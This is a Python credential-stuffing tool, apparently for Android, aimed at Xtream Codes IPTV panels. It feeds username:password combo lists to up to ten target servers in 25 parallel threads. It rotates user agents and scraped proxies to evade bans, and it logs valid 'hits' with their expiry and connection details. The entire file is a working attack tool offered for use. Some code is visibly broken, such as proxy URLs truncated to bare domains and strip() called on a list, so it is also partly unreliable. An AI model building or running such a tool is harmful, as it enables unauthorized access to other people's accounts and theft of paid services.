import os
import sys
import time
import random
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import init, Fore, Style

# Inicializar colorama de manera global
init(autoreset=True)

# Códigos de colores ANSI limpios para la interfaz dinámica
VERDE = '\033[92m'
CIAN = '\033[96m'
ROJO = '\033[91m'
AMARILLO = '\033[93m'
BLANCO = '\033[97m'
RESET = '\033[0m'

# BANNER HACKER: Estructura fija alineada con tu firma original
BANNER_RECUADRO = f"""
{Fore.GREEN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗
║                                                        ║
║  {Fore.CYAN}{Style.BRIGHT}🥷🏻  DESARROLLADOR ZURDO 🇪🇨 🥷🏻                          {Fore.GREEN}║
║                                                        ║
║  {Fore.YELLOW}"Todos podemos lograrlo con dedicacion y constancia"  {Fore.GREEN}║
║                                                        ║
╚════════════════════════════════════════════════════════╝"""

# Variables globales de control para la inyección de red
PROXIES_GLOBALES = []
USAR_PROXIES = False
ARCHIVO_PROXY_SELECCIONADO = ""

# Pool de User-Agents reales integrados de ZurdoV2 para protección Anti-Ban universal
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def arranque():
    """Función de arranque original intacta"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    for txt in ["🛸 Inicializando directorios Android...", "🧬 Desplegando hilos masivos...", "🛡️ Cargando sistema de protección IP...", "💎 Módulos cargados correctamente.\n"]:
        print(Fore.CYAN + txt)
        time.sleep(0.02)

def emitir_pitido_hit():
    """Módulo acústico y físico heredado de ZurdoV2. Integra vibración en Android y pitido universal"""
    try:
        import androidhelper
        droid = androidhelper.Android()
        droid.vibrate(300)
    except:
        pass
    sys.stdout.write('\a')
    sys.stdout.flush()

def preparar_directorios_universales():
    """Mejora adaptativa automática: detecta permisos de almacenamiento en tu Tecno Camon 18P"""
    p_dir = "/storage/emulated/0/proxy"
    c_dir = "/storage/emulated/0/combo"
    h_dir = "/storage/emulated/0/hits"
    
    # Bypass dinámico en caso de restricciones estrictas de Android 11+ o QPython local
    if not os.path.exists("/storage/emulated/0") or not os.access("/storage/emulated/0", os.W_OK):
        p_dir = "./proxy"
        c_dir = "./combo"
        h_dir = "./hits"
        
    for path in [p_dir, c_dir, h_dir]:
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except:
                pass
    return p_dir, c_dir, h_dir

def verificar_un_proxy(p_dict):
    """Prueba la conectividad real de un proxy usando un agente aleatorio de ZurdoV2 y un timeout óptimo"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        r = requests.get("https://ipify.org", headers=headers, proxies=p_dict, timeout=2.5)
        if r.status_code == 200:
            return True, p_dict
    except:
        pass
    return False, p_dict

def descargar_proxies_en_linea(protocolo_tipo):
    """Descarga proxies en vivo utilizando las 2 fuentes de GitHub originales de tu segundo script"""
    print(f"\n{Fore.YELLOW}📡 Conectando a tus repositorios y servidores de red...")
    
    # Tus fuentes basadas en repositorios públicos en crudo (.txt)
    if protocolo_tipo == '1':
        url_source = "https://githubusercontent.com"
    elif protocolo_tipo == '2':
        url_source = "https://githubusercontent.com"
    elif protocolo_tipo == '3':
        url_source = "https://githubusercontent.com"
        
    lineas_descargadas = []
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = requests.get(url_source, headers=headers, timeout=6)
        if r.status_code == 200:
            lineas_descargadas = [l.strip() for l in r.text.split("\n") if l.strip() and not l.startswith("#")]
    except:
        pass
        
    # Tu fuente de respaldo #2 (Si GitHub falla, conmuta automáticamente a ProxyScrape API)
    if not lineas_descargadas:
        try:
            proto_str = "http" if protocolo_tipo == '1' else ("socks4" if protocolo_tipo == '2' else "socks5")
            fallback_url = f"https://proxyscrape.com{proto_str}&timeout=1500&country=all"
            r = requests.get(fallback_url, timeout=5)
            if r.status_code == 200:
                lineas_descargadas = [l.strip() for l in r.text.split("\n") if l.strip()]
        except:
            pass
            
    return lineas_descargadas

def preguntar_y_cargar_proxies(p_dir):
    """Menú original respetado al 100% con la inyección corregida y verificación paralela anti-lag"""
    global PROXIES_GLOBALES, USAR_PROXIES, ARCHIVO_PROXY_SELECCIONADO
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER_RECUADRO)
        print(f"{Fore.YELLOW}🛡️  SISTEMA DE ASIGNACIÓN DE RED IP:")
        print(f" {Fore.CYAN}{Fore.RESET} PROXIES DEL SISTEMA (Archivos Locales .txt)")
        print(f" {Fore.CYAN}{Fore.RESET} PROXIES EN LÍNEA (Descarga Automática Actualizada)")
        print(f" {Fore.CYAN}{Fore.RESET} CANCELAR (Usar Internet Residencial Directo)")
        print(Fore.MAGENTA + "════════════════════════════════════════════")
        
        opc_principal = input(f"{Fore.YELLOW}👉 Selecciona tu modo de red (1-3): {Fore.CYAN}").strip()
        
        if opc_principal == '3':
            USAR_PROXIES = False
            PROXIES_GLOBALES = []
            print(f"{Fore.YELLOW}⚠️  Sistema IP: Trabajando con tu internet residencial directo.")
            time.sleep(1.5)
            return

        descarga_online = False
        if opc_principal == '1':
            try:
                archivos_proxy = [f for f in os.listdir(p_dir) if f.endswith('.txt')]
            except:
                archivos_proxy = []
                
            if not archivos_proxy:
                print(f"{Fore.RED}❌ No se encontraron archivos de proxies (.txt) en la ruta: {p_dir}")
                print(f"{Fore.YELLOW}🔄 Prueba usando la opción de proxies en línea.")
                time.sleep(2.5)
                continue

            print(f"\n{Fore.YELLOW}📂 ARCHIVOS DETECTADOS EN EL SISTEMA:")
            for idx, archivo in enumerate(archivos_proxy, 1):
                print(f" {Fore.CYAN}[{Fore.YELLOW}{idx:02d}{Fore.CYAN}]{Fore.RESET} {archivo}")
            print(Fore.MAGENTA + "════════════════════════════════════════════")
            
            try:
                sel = int(input(f"{Fore.YELLOW}👉 Selecciona tu archivo de proxies: {Fore.CYAN}")) - 1
                if sel < 0 or sel >= len(archivos_proxy):
                    raise ValueError
                ARCHIVO_PROXY_SELECCIONADO = os.path.join(p_dir, archivos_proxy[sel])
            except:
                print(f"{Fore.RED}❌ Selección inválida. Reintentando...")
                time.sleep(1.5)
                continue
        elif opc_principal == '2':
            descarga_online = True
            ARCHIVO_PROXY_SELECCIONADO = os.path.join(p_dir, "online_scraped_proxies.txt")
        else:
            print(f"{Fore.RED}❌ Opción inválida. Por favor, elige un número del 1 al 3.")
            time.sleep(1.5)
            continue

        print(f"\n{Fore.YELLOW}🌐 SELECCIONA EL PROTOCOLO REQUERIDO:")
        print(f" {Fore.CYAN}{Fore.RESET} HTTP / HTTPS")
        print(f" {Fore.CYAN}{Fore.RESET} SOCKS4")
        print(f" {Fore.CYAN}{Fore.RESET} SOCKS5 (Evita fugas DNS)")
        
        opc_proto = input(f"{Fore.YELLOW}👉 Elige una opción (1-3): {Fore.CYAN}").strip()
        if opc_proto not in ['1', '2', '3']:
            print(f"{Fore.RED}❌ Protocolo no válido. Regresando al panel...")
            time.sleep(1.5)
            continue
            
        prefix = "http://" if opc_proto == '1' else ("socks4://" if opc_proto == '2' else "socks5h://")

        if descarga_online:
            lineas_en_crudo = descargar_proxies_en_linea(opc_proto)
        else:
            lineas_en_crudo = []
            try:
                with open(ARCHIVO_PROXY_SELECCIONADO, "r", encoding="utf-8", errors="ignore") as f:
                    lineas_en_crudo = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except:
                pass

        if not lineas_en_crudo:
            print(f"{Fore.RED}❌ Origen vacío. No se obtuvieron proxies. Prueba otra opción.")
            time.sleep(2.5)
            continue

        proxies_candidatos = []
        for ip_raw in lineas_en_crudo:
            ip_limpia = ip_raw.replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
            proxies_candidatos.append({"http": f"{prefix}{ip_limpia}", "https": f"{prefix}{ip_limpia}"})

        print(f"\n{Fore.YELLOW}🔎 Verificando estabilidad de {len(proxies_candidatos)} proxies en paralelo...")
        proxies_vivos = []

        with ThreadPoolExecutor(max_workers=40) as checker_executor:
            futs = {checker_executor.submit(verificar_un_proxy, p): p for p in proxies_candidatos[:300]}
            for val in as_completed(futs):
                sirve, p_dict = val.result()
                if sirve:
                    proxies_vivos.append(p_dict)
                    sys.stdout.write(f"\r{Fore.GREEN}[VIVOS]: {len(proxies_vivos)} proxies estables detectados.")
                    sys.stdout.flush()
        
        if proxies_vivos:
            PROXIES_GLOBALES = proxies_vivos
            USAR_PROXIES = True
            print(f"\n\n{Fore.GREEN}✅ ¡Verificación Completa! {len(PROXIES_GLOBALES)} proxies listos para usar.")
            try:
                with open(ARCHIVO_PROXY_SELECCIONADO, "w", encoding="utf-8") as f:
                    for p in PROXIES_GLOBALES:
                        f.write(p['http'] + "\n")
            except:
                pass
            time.sleep(2.0)
            return
        else:
            print(f"\n\n{Fore.RED}❌ Todos los proxies fallaron el test de velocidad. Reintentando...")
            time.sleep(2.5)

def realizar_consulta_panel(url_panel, usuario, contrasena, h_dir):
    """Módulo de verificación Xtream Codes extendido de ZurdoV2. Extrae y clasifica la vigencia"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy = random.choice(PROXIES_GLOBALES) if USAR_PROXIES and PROXIES_GLOBALES else None
    
    url_base = url_panel.rstrip('/')
    target_url = f"{url_base}/player_api.php?username={usuario}&password={contrasena}"
    
    try:
        r = requests.get(target_url, headers=headers, proxies=proxy, timeout=3.5)
        if r.status_code == 200:
            try:
                data = r.json()
                auth = data.get("user_info", {}).get("auth", 0)
                
                if str(auth).strip() == "1" or auth is True:
                    u_info = data.get("user_info", {})
                    status = u_info.get("status", "Active")
                    expira_raw = u_info.get("exp_date")
                    max_connections = u_info.get("max_connections", "N/A")
                    active_cons = u_info.get("active_cons", "N/A")
                    is_trial = u_info.get("is_trial", "N/A")
                    created_at = u_info.get("created_at", "N/A")
                    
                    tipo_vencimiento = "ilimitado"
                    
                    if expira_raw and str(expira_raw).strip().lower() != "null":
                        try:
                            timestamp_exp = int(expira_raw)
                            expira = datetime.fromtimestamp(timestamp_exp).strftime('%Y-%m-%d %H:%M:%S')
                            
                            # Condicionales para clasificar las cuentas por tiempo (30 días = 2592000 seg)
                            segundos_restantes = timestamp_exp - int(time.time())
                            if segundos_restantes <= 2592000:
                                tipo_vencimiento = "pronto"
                            else:
                                tipo_vencimiento = "mucho"
                        except:
                            expira = "Ilimitado"
                            tipo_vencimiento = "ilimitado"
                    else:
                        expira = "Ilimitado"
                        tipo_vencimiento = "ilimitado"
                        
                    try:
                        creado = datetime.fromtimestamp(int(created_at)).strftime('%Y-%m-%d') if created_at else "N/A"
                    except:
                        creado = "N/A"

                    # Tu recuadro original de datos intacto sin quitarle ninguna línea
                    resultado_formateado = (
                        f"╔══════════════════ [ HIT ENCONTRADO ] ══════════════════\n"
                        f" 🔗 PANEL: {url_base}\n"
                        f" 👤 CUENTA: {usuario}:{contrasena}\n"
                        f" 🟢 ESTADO: {status} | ⏳ EXPIRA: {expira}\n"
                        f" 🔌 CONEXIONES: {active_cons}/{max_connections} | 🧪 DEMO: {is_trial}\n"
                        f" 📅 CREADO: {creado}\n"
                        f"╚═════════════════════════════════════════════════════════\n"
                    )
                    
                    ruta_hit = os.path.join(h_dir, "hits_validos.txt")
                    with open(ruta_hit, "a", encoding="utf-8") as f:
                        f.write(resultado_formateado)
                        
                    emitir_pitido_hit()
                    return "HIT", tipo_vencimiento, resultado_formateado
                else:
                    return "BAD", None, f"{usuario}:{contrasena} -> Credenciales Incorrectas"
            except:
                return "BAD", None, f"{usuario}:{contrasena} -> Respuesta inválida"
        else:
            return "ERROR", None, f"HTTP Error: {r.status_code}"
    except:
        return "TIMEOUT", None, "Timeout"

def bucle_procesador_masivo(p_dir, c_dir, h_dir):
    """Módulo integrado de ZurdoV2. Soporta entrada manual de hasta 10 servidores y corre a 25 bots estables"""
    print(f"\n{Fore.MAGENTA}════════════════════════════════════════════")
    print(f"{Fore.YELLOW}⚙️ CONFIGURACIÓN DE PANELES OBJETIVO (MÁXIMO 10):")
    
    try:
        cant_paneles = int(input(f"{Fore.YELLOW}👉 ¿Cuántos servidores deseas configurar en paralelo? (1-10): {Fore.CYAN}"))
        if cant_paneles < 1: cant_paneles = 1
        if cant_paneles > 10: cant_paneles = 10
    except:
        cant_paneles = 1

    lista_paneles = []
    for i in range(cant_paneles):
        url_in = input(f"{Fore.YELLOW} 🔗 URL del Servidor #{i+1}: {Fore.CYAN}").strip()
        if url_in:
            if not url_in.startswith("http"):
                url_in = "http://" + url_in
            lista_paneles.append(url_in)

    if not lista_paneles:
        print(f"{Fore.RED}❌ Lista de objetivos vacía. Abortando.")
        time.sleep(2.0)
        return

    try:
        archivos_combo = [f for f in os.listdir(c_dir) if f.endswith('.txt')]
    except:
        archivos_combo = []

    if not archivos_combo:
        print(f"{Fore.RED}❌ No se encontraron combos (.txt) en la ruta: {c_dir}")
        time.sleep(3.0)
        return

    print(f"\n{Fore.YELLOW}📂 ARCHIVOS DE COMBOS DISPONIBLES:")
    for idx, combo_f in enumerate(archivos_combo, 1):
        print(f" {Fore.CYAN}[{Fore.YELLOW}{idx:02d}{Fore.CYAN}]{Fore.RESET} {combo_f}")
    
    try:
        sel_c = int(input(f"{Fore.YELLOW}👉 Selecciona tu número de combo: {Fore.CYAN}")) - 1
        archivo_combo_final = os.path.join(c_dir, archivos_combo[sel_c])
    except:
        print(f"{Fore.RED}❌ Selección inválida.")
        time.sleep(1.5)
        return

    cuentas_limpias = []
    try:
        with open(archivo_combo_final, "r", encoding="utf-8", errors="ignore") as f:
            for linea in f:
                l_s = linea.strip()
                if l_s and ":" in l_s and not l_s.startswith("#"):
                    parts = l_s.split(":")
                    if len(parts) >= 2:
                        cuentas_limpias.append((parts.strip(), parts.strip()))
    except:
        pass

    if not cuentas_limpias:
        print(f"{Fore.RED}❌ El archivo no contiene credenciales válidas.")
        time.sleep(2.5)
        return

    # Ajuste manual estricto: 25 bots simultáneos para mitigar lag universal
    limite_bots = 25
    print(f"\n{Fore.GREEN}🔥 Iniciando escaneo con {limite_bots} bots estables en paralelo...")
    print(f"{Fore.WHITE}Monitoreando progreso en tiempo real. Presiona CTRL + C para salir al menú.\n")
    time.sleep(1.5)

    totales = len(cuentas_limpias) * len(lista_paneles)
    procesados = 0
    
    # Contadores dinámicos clasificados por emojis
    cuenta_ilimitados = 0   # 💎 (Nunca vencen)
    cuenta_mucho_tiempo = 0  # 🟢 (Vencen después de mucho)
    cuenta_pronto_vence = 0  # ⚠️ (Vencen pronto)

    with ThreadPoolExecutor(max_workers=limite_bots) as executor:
        futuros = []
        for u, p in cuentas_limpias:
            for server in lista_paneles:
                futuros.append(executor.submit(realizar_consulta_panel, server, u, p, h_dir))

        try:
            for fut in as_completed(futuros):
                res_tipo, venc_tipo, msg = fut.result()
                procesados += 1
                
                if res_tipo == "HIT":
                    if venc_tipo == "ilimitado":
                        cuenta_ilimitados += 1
                    elif venc_tipo == "mucho":
                        cuenta_mucho_tiempo += 1
                    elif venc_tipo == "pronto":
                        cuenta_pronto_vence += 1
                        
                    print(f"\n{Fore.GREEN}{msg.strip()}")
                
                # Barra de progreso dinámica que refresca la misma línea (Anti-Lag)
                sys.stdout.write(
                    f"\r{Fore.CYAN}[PROGRESO]: {procesados}/{totales} | "
                    f"{Fore.CYAN}💎: {cuenta_ilimitados} | "
                    f"{Fore.GREEN}🟢: {cuenta_mucho_tiempo} | "
                    f"{Fore.YELLOW}⚠️: {cuenta_pronto_vence} | "
                    f"{Fore.WHITE}[PROXIES]: {len(PROXIES_GLOBALES) if USAR_PROXIES else 'N/A'}"
                )
                sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}🛑 Proceso pausado de manera controlada.")

    print(f"\n\n{Fore.GREEN}🏁 [FIN DEL PROCESO] Verificación terminada correctamente.")
    input(f"\n{Fore.YELLOW}Presiona ENTER para regresar al panel principal...")

def iniciar_flujo_completo():
    p_dir, c_dir, h_dir = preparar_directorios_universales()
    while True:
        arranque()
        preguntar_y_cargar_proxies(p_dir)
        bucle_procesador_masivo(p_dir, c_dir, h_dir)

if __name__ == "__main__":
    try:
        iniciar_flujo_completo()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}❌ Script cerrado por el usuario. ¡Hasta la próxima, Zurdo!")
        sys.exit(0)
